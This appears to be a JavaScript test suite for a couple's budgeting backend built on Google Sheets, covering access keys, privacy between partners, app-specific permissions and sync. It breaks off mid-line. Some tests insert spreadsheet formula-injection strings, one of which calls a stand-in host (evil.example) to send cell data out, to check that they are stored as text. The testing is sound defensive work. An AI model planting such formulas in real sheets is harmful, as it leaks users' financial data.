// Run with: node test/backend.test.js
const makeEnv = require("./fake-gas.js"), fixture = require("./fixture.js");
let fails = 0, passes = 0;
const near = (name, got, want) => ok(name, Math.abs(got - want) < 0.011, {got, want});
const ok = (name, cond, extra) => { cond ? passes++ : fails++; if (!cond) console.log("FAIL", name, extra !== undefined ? JSON.stringify(extra).slice(0, 400) : ""); };
const env = makeEnv(), c = env.ctx;
const call = (body) => JSON.parse(c.handle_(body).text);

// set up the tabs and load the household
c.setup();
const fx = fixture();
Object.keys(fx).forEach(t => {
  if (!env.sheets[t]) return;
  const sh = env.sheets[t], head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0];
  fx[t].forEach(r => sh.appendRow(head.map(h => r[h] === undefined ? "" : r[h])));
});
c.CACHE_ = {};
// keys are made for people present at setup: run again now people exist
c.setup();
const kE = env.props.KEY_ethan, kS = env.props.KEY_sophie;
ok("keys for both", kE && kS && kE !== kS);
ok("wrong key refused", call({key: "nope"}).ok === false);

// first sync: full copy
const s1 = call({key: kE});
ok("sync ok", s1.ok, s1);
ok("Ethan sees his accounts", s1.rows.accounts.some(a => a.id === "e-main"));
ok("dates come back as dates", s1.rows.valuations[0].date === "2026-10-26", s1.rows.valuations[0]);
ok("partner summary worked out on the server", s1.partnerSummary && s1.partnerSummary.name === "Sophie", s1.partnerSummary);

// Ethan logs a payment; Sophie logs a private one and a split one
const r1 = call({key: kE, since: s1.now, ops: [{op: "put", table: "transactions", row: {id: "app-1", date: "2026-10-27", person: "ethan", amount: 12.5, budget: "e-food-b", account: "e-main"}}]});
ok("Ethan's payment saved", r1.ok && r1.applied.length === 1, r1);
ok("only changes come back", r1.rows.transactions.length === 1 && r1.rows.accounts.length < 3, r1.rows && r1.rows.accounts);
const r2 = call({key: kS, ops: [
  {op: "put", table: "transactions", row: {id: "app-2", date: "2026-10-27", person: "sophie", amount: 9, budget: "s-food", account: "s-main"}},
  {op: "put", table: "transactions", row: {id: "app-3", date: "2026-10-27", person: "sophie", amount: 20, budget: "s-food", account: "s-main", split: "half"}}
]});
ok("Sophie's payments saved", r2.ok && r2.applied.length === 2, r2);
// sending the same thing twice only saves it once
call({key: kS, ops: [{op: "put", table: "transactions", row: {id: "app-2", date: "2026-10-27", person: "sophie", amount: 9, budget: "s-food", account: "s-main"}}]});
c.CACHE_ = {};
ok("no duplicates", c.readTable_("transactions").rows.filter(r => r.id === "app-2").length === 1);

// privacy: Ethan sees Sophie's split payment but not her private one
c.CACHE_ = {};
const s2 = call({key: kE, full: true});
const ids = s2.rows.transactions.map(t => t.id);
ok("split payment shared", ids.includes("app-3"), ids);
ok("private payment hidden", !ids.includes("app-2"), ids);
// ...unless she shares each payment
call({key: kS, ops: [{op: "put", table: "settings", row: {id: "sophie:share.payments", person: "sophie", key: "share.payments", value: "true"}}]});
c.CACHE_ = {};
ok("shared when she turns it on", call({key: kE, full: true}).rows.transactions.some(t => t.id === "app-2"));

// nobody can change the other's things
const bad = call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "app-2", person: "ethan", amount: 1}}]});
ok("can't overwrite Sophie's payment", bad.ok && bad.rejected.length === 1 && bad.rejected[0].id === "app-2" && !bad.applied.length, bad);
const bad2 = call({key: kE, ops: [{op: "put", table: "budgets", row: {id: "x", person: "sophie", name: "Sneaky", amount: 1}}]});
ok("can't add to Sophie's budget", bad2.ok && bad2.rejected.length === 1, bad2);

// deleting keeps the row, marked deleted
call({key: kE, ops: [{op: "delete", table: "transactions", id: "app-1"}]});
c.CACHE_ = {};
const row = c.readTable_("transactions").rows.find(r => r.id === "app-1");
ok("soft delete", row && row.deleted === true, row);

// budget tabs
c.CACHE_ = {};
c.refreshBudgetTabs();
ok("budget tabs written", env.sheets["Ethan budget"] && env.sheets["Sophie budget"] && env.sheets["Ethan budget"]._s.cells.length > 10);
const eb = env.sheets["Ethan budget"]._s.cells.map(r => r[0]);
ok("budget tab has sections", ["Coming in", "Bills to pay", "What you can spend", "What's saved", "Left over"].every(x => eb.includes(x)), eb);
// a bill named like a formula goes into the budget tab as plain text
{ const evil = '=IMPORTDATA("https://evil.example/?d="&A1)';
  const sb = c.readTable_("bills").rows.find(r => r.person === "sophie");
  call({key: env.props.KEY_sophie, ops: [{op: "put", table: "bills", row: Object.assign({}, sb, {_row: undefined, name: evil})}]});
  // look at exactly what's handed to the sheet (the fake, like Sheets, hides a leading apostrophe once stored)
  const sh = env.sheets["Sophie budget"], gr = sh.getRange, sent = [];
  sh.getRange = function () { const rg = gr.apply(sh, arguments), sv = rg.setValues; rg.setValues = (v) => { v.forEach(row => row.forEach(x => sent.push(x))); return sv(v); }; return rg; };
  c.CACHE_ = {}; c.refreshBudgetTabs(); sh.getRange = gr;
  ok("S10b: names in the budget tabs can't be formulas", sent.indexOf("'" + evil) >= 0 && sent.indexOf(evil) < 0, sent.filter(x => /IMPORT/.test(String(x)))); }

// connect links
c.WEB_APP_URL = "https://script.google.com/macros/s/TEST/exec";
c.connectLinks();
ok("connect links made", env.logs.filter(l => /#connect=/.test(l)).length === 2, env.logs);

// ================= review fixes (1.3.0) =================
const B = require("../engine.js");
// a fresh sheet with the test household (mut changes the household first)
const fresh = (mut) => {
  const env = makeEnv(), c = env.ctx; c.setup(); const fx = fixture(); if (mut) mut(fx);
  Object.keys(fx).forEach(t => { const sh = env.sheets[t]; if (!sh) return; const head = sh.getRange(1, 1, 1, sh.getLastColumn()).getValues()[0]; fx[t].forEach(r => sh.appendRow(head.map(h => r[h] === undefined ? "" : r[h]))); });
  c.CACHE_ = {}; c.setup();
  const call = (b) => { c.CACHE_ = {}; return JSON.parse(c.handle_(b).text); };
  return {env, c, call, kE: env.props.KEY_ethan, kS: env.props.KEY_sophie};
};
const wait = (ms) => { const t = Date.now(); while (Date.now() - t < ms) {} };
// a phone that keeps its tables and merges like the app
const phone = (F, k) => { const P = {T: {}, since: 0}; P.sync = (ops) => { const j = F.call({key: k, since: P.since, full: !P.since, ops}); if (!j.ok) return j; if (j.full) P.T = {}; Object.keys(j.rows).forEach(t => { P.T[t] = P.T[t] || []; j.rows[t].forEach(r => { const i = P.T[t].findIndex(x => (t === "meta" ? x.key === r.key : x.id === r.id)); if (i >= 0) P.T[t][i] = r; else P.T[t].push(r); }); }); P.since = j.now; return j; }; return P; };

// #2 nobody can make themselves their own partner, or change who anyone's partner is
{
  const F = fresh(t => t.transactions.push({id: "s-private", date: "2026-10-27", person: "sophie", amount: 55, budget: "s-food", account: "s-main"}));
  const r = F.call({key: F.kE, ops: [{op: "put", table: "people", row: {id: "ethan", partner: "ethan"}}, {op: "put", table: "settings", row: {id: "ethan:share.payments", person: "ethan", key: "share.payments", value: "true"}}, {op: "put", table: "people", row: {id: "sophie", name: "Hacked"}}, {op: "put", table: "people", row: {id: "ethan", colour: "teal"}}]});
  ok("#2 partner change refused", r.ok && r.rejected.map(x => x.i).join() === "0,2", r.rejected);
  ok("#2 own name or colour still fine", r.applied.some(x => x.table === "people" && x.id === "ethan"), r.applied);
  const s = F.call({key: F.kE, full: true});
  ok("#2 Sophie's private payment stays private", !s.rows.transactions.some(x => x.id === "s-private") && !s.rows.income.some(x => x.person === "sophie"));
  // even if the sheet names him as his own partner, he gets nothing extra
  const sh = F.env.sheets.people, head = sh._s.cells[0]; sh._s.cells.find(x => x[0] === "ethan")[head.indexOf("partner")] = "ethan";
  const s2 = F.call({key: F.kE, full: true});
  ok("#2 self as partner gives nothing and no summary", !s2.rows.transactions.some(x => x.id === "s-private") && s2.partnerSummary === null, s2.partnerSummary);
}

// #3 actual pay, pay rises and private bill changes aren't sent to the partner
{
  const F = fresh(t => {
    t.exceptions.push({id: "x-actual", item: "s-pay", date: "2026-11-27", action: "amount", amount: 2050}, {id: "x-split", item: "e-flat", date: "2026-11-01", action: "amount", amount: 480});
    t.amounts.push({id: "a-rise", item: "s-pay", start: "2027-04-01", amount: 2400}, {id: "a-lisa", item: "s-lisa-b", start: "2027-01-01", amount: 300});
    t.accounts.push({id: "s-lisa", owner: "sophie", name: "LISA", kind: "lisa"}); t.budgets.push({id: "s-lisa-b", person: "sophie", name: "LISA", amount: 250, mode: "saving", account: "s-lisa"});
  });
  const s = F.call({key: F.kE, full: true});
  ok("#3 Sophie's actual pay hidden", !s.rows.exceptions.some(x => x.id === "x-actual"), s.rows.exceptions);
  ok("#3 Sophie's pay rise hidden", !s.rows.amounts.some(x => x.id === "a-rise"), s.rows.amounts);
  ok("#3 a change to a shared bill is shared", s.rows.exceptions.some(x => x.id === "x-split"));
  ok("#3 her LISA saving and its changes are shared (house goal)", s.rows.budgets.some(x => x.id === "s-lisa-b") && s.rows.amounts.some(x => x.id === "a-lisa"));
  const own = F.call({key: F.kS, full: true});
  ok("#3 Sophie still sees her own", own.rows.exceptions.some(x => x.id === "x-actual") && own.rows.amounts.some(x => x.id === "a-rise"));
}

// #4 a refused change doesn't hold up the rest
{
  const F = fresh(t => t.transactions.push({id: "s-private", date: "2026-10-27", person: "sophie", amount: 55, budget: "s-food", account: "s-main"}));
  const ops = [{op: "put", table: "transactions", row: {id: "q1", date: "2026-10-28", person: "ethan", amount: 1, budget: "e-fun"}}, {op: "delete", table: "transactions", id: "s-private"},
    {op: "put", table: "transactions", row: {id: "q3", date: "2026-10-28", person: "ethan", amount: 3, budget: "e-fun"}}, {op: "put", table: "nope", row: {id: "z"}}, {op: "put", table: "prices", row: {id: "p", fund: "X", price: 1}}, {op: "put", table: "transactions", row: {}}];
  const r = F.call({key: F.kE, since: Date.now(), ops});
  ok("#4 ok with the refused ones listed", r.ok && JSON.stringify(r.rejected.map(x => [x.i, x.table, x.id])) === JSON.stringify([[1, "transactions", "s-private"], [3, "nope", "z"], [4, "prices", "p"], [5, "transactions", ""]]), r.rejected);
  ok("#4 the rest saved", r.applied.map(x => x.id).join() === "q1,q3", r.applied);
  F.c.CACHE_ = {}; ok("#4 in the sheet", F.c.readTable_("transactions").rows.filter(x => /^q/.test(x.id)).length === 2);
  ok("#4 wrong key is still a failure", F.call({key: "nope"}).ok === false);
}

// #5 the response says which engine it runs
{ const F = fresh(); ok("#5 engine version", F.call({key: F.kE}).engine === B.VERSION && /^\d+\.\d+\.\d+$/.test(B.VERSION)); }

// #16 the partner's split payment matches your budget on your own phone; partner start date and LISA moves arrive
{
  const F = fresh(t => {
    t.settings.find(s => s.person === "sophie").value = "2026-10-20";
    t.transactions.push({id: "e-split", date: "2026-10-27", person: "ethan", amount: 40, budget: "e-food-b", account: "e-food", split: "half"});
    t.moves.push({id: "e-lisa-mv", date: "2026-10-29", person: "ethan", from: "e-main", to: "e-lisa", amount: 333, key: "pay:2026-10-29:e-lisa"}, {id: "e-other-mv", date: "2026-10-29", person: "ethan", from: "e-main", to: "e-food", amount: 200, key: "pay:2026-10-29:e-food"});
  });
  const S = phone(F, F.kS); S.sync(); const E = phone(F, F.kE); E.sync();
  const food = B.today(B.load(S.T, "2026-10-28"), "sophie", "2026-10-28").tiles.find(t => t.name === "Food");
  ok("#16 Sophie's phone counts her half of Ethan's split shop", food && food.spent === 20, food);
  const stub = S.T.budgets.find(b => b.id === "e-food-b");
  ok("#16 Ethan's budget arrives as a name only", stub && stub.hidden && stub.amount === undefined && stub.account === undefined, stub);
  ok("#16 Ethan's phone knows when Sophie started", B.startOf(B.load(E.T), "sophie") === "2026-10-20");
  ok("#16 Ethan's LISA moves are shared, his other moves aren't", S.T.moves.some(m => m.id === "e-lisa-mv") && !S.T.moves.some(m => m.id === "e-other-mv"));
}

// #17 rows that become visible or private, and edits typed into the sheet, reach the other phone
{
  const F = fresh(); const E = phone(F, F.kE); E.sync();
  F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "old-priv", date: "2026-10-27", person: "sophie", amount: 9, budget: "s-food", account: "s-main"}}, {op: "put", table: "transactions", row: {id: "sx", date: "2026-10-27", person: "sophie", amount: 60, budget: "s-food", account: "s-main", split: "half"}}]});
  wait(5100); E.sync();
  ok("#17 split arrives, private doesn't", E.T.transactions.some(x => x.id === "sx" && !x.deleted) && !E.T.transactions.some(x => x.id === "old-priv" && !x.deleted));
  near("#17 Ethan owes his half", B.between(B.load(E.T, "2026-10-28"), "ethan", "2026-10-28").iOwe, 30);
  F.call({key: F.kS, ops: [{op: "put", table: "transactions", row: {id: "sx", split: ""}}]});
  E.sync();
  near("#17 split taken off: Ethan's phone agrees nothing is owed", B.between(B.load(E.T, "2026-10-28"), "ethan", "2026-10-28").iOwe, 0);
  ok("#17 the row is gone from his phone", !B.load(E.T).transactions.some(x => x.id === "sx"));
  F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:share.payments", person: "sophie", key: "share.payments", value: "true"}}]});
  const j = E.sync();
  ok("#17 sharing on: older private rows arrive", j.full === true && B.load(E.T).transactions.some(x => x.id === "old-priv"));
  F.call({key: F.kS, ops: [{op: "put", table: "settings", row: {id: "sophie:share.payments", person: "sophie", key: "share.payments", value: "false"}}]});
  E.sync();
  ok("#17 sharing off: they leave his phone", !B.load(E.T).transactions.some(x => x.id === "old-priv"));
  // typed straight into the sheet
  const sh = F.env.sheets.transactions, head = sh._s.cells[0], ri = sh._s.cells.findIndex(x => x[0] === "sx");
  sh._s.cells[ri][head.indexOf("amount")] = 80; sh._s.cells[ri][head.indexOf("split")] = "half";
  F.c.CACHE_ = {}; F.c.onEdit({range: {getSheet: () => sh, getRow: () => ri + 1, getLastRow: () => ri + 1, getColumn: () => head.indexOf("amount") + 1, getLastColumn: () => head.indexOf("split") + 1}});
  E.sync();
  ok("#17 a sheet edit reaches the phone", (B.load(E.T).transactions.find(x => x.id === "sx") || {}).amount === 80, E.T.transactions.find(x => x.id === "sx"));
  ok("#17 and says who", sh._s.cells[ri][head.indexOf("by")] === "sheet");
}

// #18 a batch of changes doesn't read the whole tab again for each one
{
  const F = fresh(t => { for (let i = 0; i < 3000; i++) t.transactions.push({id: "old" + i, date: "2026-10-27", person: "ethan", amount: 1, budget: "e-fun", account: "e-main"}); });
  F.env.props.VIEWS_AT = String(Date.now());   // the budget tabs were just refreshed (that reads every tab, once a minute)
  let reads = 0; const sh = F.env.sheets.transactions, orig = sh.getDataRange; sh.getDataRange = () => { reads++; return orig(); };
  const ops = []; for (let i = 0; i < 40; i++) ops.push({op: "put", table: "transactions", row: {id: "n" + i, date: "2026-10-28", person: "ethan", amount: 2, budget: "e-fun", account: "e-main"}});
  ops.push({op: "put", table: "transactions", row: {id: "n3", amount: 5}});
  const r = F.call({key: F.kE, since: Date.now(), ops});
  ok("#18 one read of the tab for 41 changes", r.ok && r.applied.length === 41 && reads === 1, reads);
  F.c.CACHE_ = {}; const rows = F.c.readTable_("transactions").rows;
  ok("#18 and every change is in the sheet", rows.filter(x => /^n\d+$/.test(x.id)).length === 40 && rows.find(x => x.id === "n3").amount === 5 && rows.find(x => x.id === "n3").date === "2026-10-28");
  ok("#18 the reply has the new rows", r.rows.transactions.filter(x => /^n\d+$/.test(x.id)).length === 40, r.rows.transactions.length);
  // the partner summary is worked out once per change, not on every poll
  const sums = () => Object.keys(F.env.cache).filter(k => /^sum:/.test(k)).length;
  const s1 = F.call({key: F.kE}); const cached = sums(); const s2 = F.call({key: F.kE});
  ok("#18 partner summary kept between polls", cached === 1 && JSON.stringify(s1.partnerSummary) === JSON.stringify(s2.partnerSummary) && sums() === 1);
}

// #23 hardening: formulas stay text, no keys in URLs
{
  const F = fresh();
  F.call({key: F.kE, ops: [{op: "put", table: "transactions", row: {id: "fx", date: "2026-10-28", person: "ethan", amount: 2, budget: "e-fun", note: "=IMPORTDATA(\"https://x\")"}}, {op: "put", table: "transactions", row: {id: "neg", date: "2026-10-28", person: "ethan", amount: "-20", budget: "e-fun", note: "-20"}}]});
  F.c.CACHE_ = {}; const rows = F.c.readTable_("transactions").rows;
  ok("#23 a formula is kept as text", rows.find(x => x.id === "fx").note === "=IMPORTDATA(\"https://x\")" && JSON.stringify(F.env.sheets.transactions._s.cells).indexOf("'=IMPORT") < 0);
  ok("#23 a negative number is still a number", rows.find(x => x.id === "neg").note === "-20");
  const g = JSON.parse(F.c.doGet({parameter: {key: F.kE}}).text);
  ok("#23 GET gives no data", g.ok && !g.rows && !g.person);
}

// prices: everyone sees them, nobody writes them from the app
{
  const F = fresh(t => { t.prices = [{id: "pr1", fund: "GB00BJS8SJ34", date: "2026-10-26", price: 1234.5, source: "fidelity"}]; });
  ok("prices tab made", !!F.env.sheets.prices);
  const s = F.call({key: F.kS, full: true});
  ok("prices sent to everyone", s.rows.prices.length === 1 && s.rows.prices[0].price === 1234.5);
}

// triggers: installTriggers keeps the prices trigger
{
  const F = fresh(); F.env.triggers.push({getHandlerFunction: () => "updatePrices"}); F.c.installTriggers(); F.c.installTriggers();
  const names = F.env.triggers.map(t => t.getHandlerFunction()).sort();
  ok("installTriggers keeps the daily prices trigger", JSON.stringify(names) === JSON.stringify(["refreshBudgetTabs", "updatePrices"]), names);
}

// ================= app keys (S1b), key checks (S7), reserved ids (S4), formula guard (S10) =================
{
  const F = fresh(t => {
    t.transactions.push(
      {id: "e-food-1", date: "2026-10-27", person: "ethan", amount: 30, budget: "e-food-b", account: "e-food", note: "Big shop"},
      {id: "e-fun-1", date: "2026-10-27", person: "ethan", amount: 18, budget: "e-fun", account: "e-main", note: "Cinema"},
      {id: "s-food-split", date: "2026-10-27", person: "sophie", amount: 40, budget: "s-food", account: "s-main", split: "half", note: "Shared shop"},
      {id: "s-food-private", date: "2026-10-27", person: "sophie", amount: 22, budget: "s-food", account: "s-main", note: "Her own shop"});
    t.settings.push({id: "ethan:theme", person: "ethan", key: "theme", value: "dark"});
  });
  const {c, env, call, kE, kS} = F;
  // appLink makes a key the first time and logs a normal connect link
  const link = c.appLink("ethan", "peckish"), m = link.match(/^(https:\/\/[^#]+)#connect=([A-Za-z0-9_-]+)$/);
  const cfg = m && JSON.parse(Buffer.from(m[2], "base64url").toString());
  ok("S1b: appLink logs a connect link", m && m[1] === "https://alertrobot.github.io/es-kitchen/" && cfg.u === "https://script.google.com/macros/s/TEST/exec" && /^app_peckish_[0-9a-f]{64}$/.test(cfg.k) && env.logs.some(l => l === "Ethan (Peckish): " + link), link);
  ok("S1b: the key lives with the script's properties", env.props.APPKEY_ethan_peckish === cfg.k);
  ok("S1b: running it again gives the same key", c.appLink("ethan", "peckish") === link);
  { const was = c.WEB_APP_URL; c.WEB_APP_URL = ""; env.props.WEB_APP_URL = "https://script.google.com/macros/s/PROP/exec";
    ok("the web app address can live in a Script Property", JSON.parse(Buffer.from(c.appLink("ethan", "peckish").split("#connect=")[1], "base64url").toString()).u === env.props.WEB_APP_URL && c.webAppUrl_() === env.props.WEB_APP_URL);
    delete env.props.WEB_APP_URL; const gs = c.ScriptApp.getService; c.ScriptApp.getService = () => ({getUrl: () => null});   // what the real editor gave
    ok("and without one, connectLinks says exactly what to add", (() => { try { c.connectLinks(); return false; } catch (e) { return /Script Property WEB_APP_URL/.test(e.message); } })());
    c.ScriptApp.getService = gs; c.WEB_APP_URL = was; }
  const kP = cfg.k;
  ok("S1b: ping says which app", JSON.stringify(call({key: kP, action: "ping"})) === JSON.stringify({ok: true, person: "ethan", app: "peckish", keyType: "app"}));
  const ps = call({key: kP, full: true});
  ok("S1b: Peckish sync works", ps.ok && ps.app === "peckish" && ps.keyType === "app" && ps.partnerSummary === null, ps.error);
  ok("S1b: only the tables it needs", JSON.stringify(Object.keys(ps.rows).sort()) === JSON.stringify(["accounts", "budgets", "people", "splits", "transactions"]), Object.keys(ps.rows));
  ok("S1b: people are names only", ps.rows.people.every(p => JSON.stringify(Object.keys(p).filter(k => k !== "deleted" && k !== "updated").sort()) === '["id","name"]') && !JSON.stringify(ps.rows.people).includes("Monzo"), ps.rows.people);
  ok("S1b: only Ethan's budgets and accounts, cut down", ps.rows.budgets.every(b => b.person === "ethan" && /food|grocer/i.test(b.name) && b.amount === undefined && b.carry === undefined) && ps.rows.budgets.length >= 1 && ps.rows.accounts.every(a => a.owner === "ethan" && a.purpose === undefined && a.order === undefined));
  const ids = ps.rows.transactions.map(t => t.id).sort();
  ok("S1b: only food shops both of you could see (the one Sophie split with him; not his private one)", JSON.stringify(ids) === JSON.stringify(["s-food-split"]), ids);
  ok("S1b: shops come cut down (no account, no bank fields)", ps.rows.transactions.every(t => t.account === undefined && t.bankId === undefined && t.review === undefined), ps.rows.transactions);
  call({key: kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.payments", person: "ethan", key: "share.payments", value: true}}]});
  const ps1 = call({key: kP, full: true});
  ok("S1b: once he shares each payment, his own food shops go to Peckish too", JSON.stringify(ps1.rows.transactions.map(t => t.id).sort()) === JSON.stringify(["e-food-1", "s-food-split"]), ps1.rows.transactions.map(t => t.id));
  // writes
  const w = call({key: kP, ops: [
    {op: "put", table: "transactions", row: {id: "t-pk-1", date: "2026-10-28", person: "ethan", amount: 52.3, budget: "e-food-b", account: "e-main", note: "Tesco (Peckish)", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-2", date: "2026-10-28", person: "sophie", amount: 5, budget: "s-food", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-3", date: "2026-10-28", person: "ethan", amount: 5, budget: "e-food-b"}},
    {op: "put", table: "transactions", row: {id: "app-1", date: "2026-10-28", person: "ethan", amount: 5, budget: "e-food-b", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "e-fun-1", amount: 1}},
    {op: "put", table: "settings", row: {id: "ethan:theme", person: "ethan", key: "theme", value: "light"}},
    {op: "put", table: "budgets", row: {id: "e-food-b", amount: 999}},
    {op: "delete", table: "transactions", id: "e-food-1"},
    {op: "put", table: "transactions", row: {id: "t-pk-4", date: "2026-10-28", person: "ethan", amount: 5, budget: "e-fun", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-5", date: "2026-10-28", person: "ethan", amount: 5, budget: "e-food-b", account: "s-main", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-6", date: "2026-10-28", person: "ethan", amount: 50, budget: "e-food-b", split: "ethan=0", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-7", date: "2026-10-28", person: "ethan", amount: 5, budget: "e-food-b", review: true, source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-8", date: "2026-10-28", person: "ethan", amount: 99999, budget: "e-food-b", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-9", date: "2026-10-28", person: "ethan", amount: 5, budget: "s-food", source: "peckish"}},
    {op: "put", table: "transactions", row: {id: "t-pk-10", date: "2026-10-28", person: "ethan", amount: 8, budget: "e-food-b", split: "half", source: "peckish"}}
  ]});
  ok("S1b: Peckish can add its own food shop, split half each or not", w.ok && w.applied.map(x => x.id).join() === "t-pk-1,t-pk-10", w.applied);
  ok("S1b: and nothing else", w.rejected.map(x => x.i).join() === "1,2,3,4,5,6,7,8,9,10,11,12,13" && w.rejected.every(x => x.error.indexOf("That's not allowed with this link") === 0), w.rejected);
  ok("S1b: not a fun budget, her account, a lopsided split, review flags, a huge amount or her budget", ["only your food budget", "only your own account", "split half each", "(review)", "amount or date", "only your food budget"].every((bit, j) => w.rejected[7 + j].error.indexOf(bit) > 0), w.rejected.slice(7));
  const far = call({key: kP, ops: [{op: "put", table: "transactions", row: {id: "t-pk-far", date: "2031-01-01", person: "ethan", amount: 5, budget: "e-food-b", source: "peckish"}}]});
  // a Peckish date is a real day: a time after it is dropped, anything else is turned down (it would never count)
  const pkd = (id, date) => call({key: kP, ops: [{op: "put", table: "transactions", row: {id, date, person: "ethan", amount: 5, budget: "e-food-b", source: "peckish"}}]});
  const dOk = pkd("t-pk-time", new Date().toISOString().slice(0, 10) + "T09:15:00Z"), dRow = (c.CACHE_ = {}, c.readTable_("transactions").rows.find(x => x.id === "t-pk-time"));
  ok("S1b: a Peckish shop with a time on its date is saved as that day", dOk.applied.length === 1 && dRow && dRow.date === new Date().toISOString().slice(0, 10), dRow);
  ok("S1b: a Peckish date with anything else after the day is turned down", ["2026-10-28junk", "2026-10-28 <b>", "2026-10-28" + "x".repeat(500)].every((d, i) => pkd("t-pk-junk" + i, d).rejected.length === 1));
  ok("S1b: a Peckish date that isn't in its month is turned down", pkd("t-pk-feb2", new Date().toISOString().slice(0, 7) + "-32").rejected.length === 1);
  call({key: kP, ops: [{op: "delete", table: "transactions", id: "t-pk-time"}]});
  ok("S1b: not dated years ahead", far.rejected.length === 1 && /amount or date/.test(far.rejected[0].error), far.rejected);
  // a shop the bank has matched to a real payment: Peckish can't clear its review flag, and taking it off keeps the payment
  c.CACHE_ = {}; c.applyOne_("ethan", {op: "put", table: "transactions", row: {id: "t-pk-10", bankId: "monzo:tx_1", review: true}}, Date.now(), "bank", {sys: true}); c.CACHE_ = {};
  const clr = call({key: kP, ops: [{op: "put", table: "transactions", row: {id: "t-pk-10", person: "ethan", source: "peckish", review: ""}}]});
  ok("S1b: Peckish can't blank fields that aren't its own", clr.rejected.length === 1 && /\(review\)/.test(clr.rejected[0].error), clr);
  const del = call({key: kP, ops: [{op: "delete", table: "transactions", id: "t-pk-10"}]});
  c.CACHE_ = {}; const kept = c.readTable_("transactions").rows.find(x => x.id === "t-pk-10");
  ok("S1b: taking off a bank-matched shop keeps the real payment for checking", del.applied.length === 1 && kept && !kept.deleted && kept.bankId === "monzo:tx_1" && kept.review === true && kept.source === "" && /taken off in Peckish/.test(kept.note), kept);
  ok("S1b: and it's no longer Peckish's to change", call({key: kP, ops: [{op: "put", table: "transactions", row: {id: "t-pk-10", person: "ethan", source: "peckish", amount: 1}}]}).rejected.length === 1);
  ok("S1b: it can change and delete its own rows", call({key: kP, ops: [{op: "put", table: "transactions", row: {id: "t-pk-1", amount: 50, source: "peckish", person: "ethan"}}, {op: "delete", table: "transactions", id: "t-pk-1"}]}).applied.length === 2);
  ok("S1b: no bank actions", call({key: kP, action: "bank.status"}).error === "That's not allowed with this link" && call({key: kP, action: "bank.disconnect"}).ok === false);
  ok("S1b: no calendar for Peckish", call({key: kP, action: "app.calendar"}).ok === false);
  // a delta sync still works, and a shop that's no longer food leaves Peckish
  const ds = call({key: kP, since: ps.now});
  ok("S1b: a later sync is always the whole (small) picture", ds.ok && ds.full === true && ds.rows.transactions.some(t => t.id === "t-pk-10") && !ds.rows.transactions.some(t => t.id === "t-pk-1"), ds.rows && ds.rows.transactions);
  ok("S1b: it never hears of rows it can't see (no stubs)", ds.rows.transactions.every(t => !t.deleted) && !ds.rows.transactions.some(t => t.id === "e-fun-1" || t.id === "s-food-private"), ds.rows.transactions);
  call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "e-food-1", budget: "e-fun"}}]});
  const ds2 = call({key: kP, since: ds.now});
  ok("S1b: a payment moved off food is dropped from Peckish", ds2.full === true && !ds2.rows.transactions.some(t => t.id === "e-food-1"), ds2.rows.transactions);
  call({key: kE, ops: [{op: "put", table: "settings", row: {id: "ethan:share.payments", person: "ethan", key: "share.payments", value: false}}]});
  ok("S1b: and turning sharing off takes his private shops back out", !call({key: kP, since: ds2.now}).rows.transactions.some(t => t.person === "ethan" && !t.split && t.source !== "peckish"));
  // Budgie keys can't take Peckish's ids
  ok("S4: a Budgie key can't make t-pk- or bk- rows", call({key: kE, ops: [{op: "put", table: "transactions", row: {id: "t-pk-9", date: "2026-10-28", person: "ethan", amount: 1, source: "peckish"}}, {op: "put", table: "transactions", row: {id: "bk-monzo-x", date: "2026-10-28", person: "ethan", amount: 1}}]}).rejected.length === 2);
  // rotating the Peckish key
  c.newAppKey("ethan", "peckish");
  ok("S1b: the old Peckish key stops working at once (even though it was cached)", call({key: kP, action: "ping"}).ok === false && env.props.APPKEY_ethan_peckish !== kP);
  ok("S1b: newKey(person, app) rotates an app key too", (c.newKey("ethan", "peckish"), env.props.APPKEY_ethan_peckish && /^app_peckish_/.test(env.props.APPKEY_ethan_peckish)));
  ok("S1b: Ethan's own key still works", call({key: kE, action: "ping"}).ok === true);
  ok("S1b: unknown app", (() => { try { c.appLink("ethan", "evil"); return false; } catch (e) { return /doesn't know/.test(e.message); } })());

  // Caledonite: only the calendar
  const cal = JSON.parse(Buffer.from(c.appLink("sophie", "caledonite").split("#connect=")[1], "base64url").toString()).k;
  ok("Caledonite: no sync", call({key: cal}).error === "That's not allowed with this link" && call({key: cal, full: true}).ok === false && call({key: cal, ops: [{op: "put", table: "transactions", row: {id: "t-1", person: "sophie", amount: 1}}]}).ok === false);
  ok("Caledonite: no bank", call({key: cal, action: "bank.status"}).ok === false);
  const cs = call({key: cal, action: "app.calendar"});
  ok("Caledonite: the calendar", cs.ok && cs.person === "sophie" && cs.name === "Sophie" && typeof cs.synced === "number" && cs.days && typeof cs.days === "object", cs);
  const flat = Object.keys(cs.days).sort().reduce((a, d) => a.concat(cs.days[d].map(x => Object.assign({date: d}, x))), []);
  ok("Caledonite: her paydays and bills only", flat.length > 0 && flat.every(x => x.pay ? /^(£.*)?$/.test(x.sub) : /^Bill, £/.test(x.sub)) && flat.some(x => x.pay) && flat.some(x => !x.pay), flat.slice(0, 6));
  ok("Caledonite: none of Ethan's bills or pay", !flat.some(x => /^(Rent|Phone|Household bills)$/.test(x.name)) && !JSON.stringify(cs).includes("Ethan"), flat.map(x => x.name));
  const dbS = B.load(call({key: kS, full: true}).rows, cs.days ? Object.keys(cs.days).sort()[0] : "2026-10-26");
  ok("Caledonite: same as Sophie's phone works out", JSON.stringify(cs.days) === JSON.stringify((() => { const today = new Intl.DateTimeFormat("en-CA", {timeZone: "Europe/London"}).format(new Date()), db = B.load(call({key: kS, full: true}).rows, today), out = {};
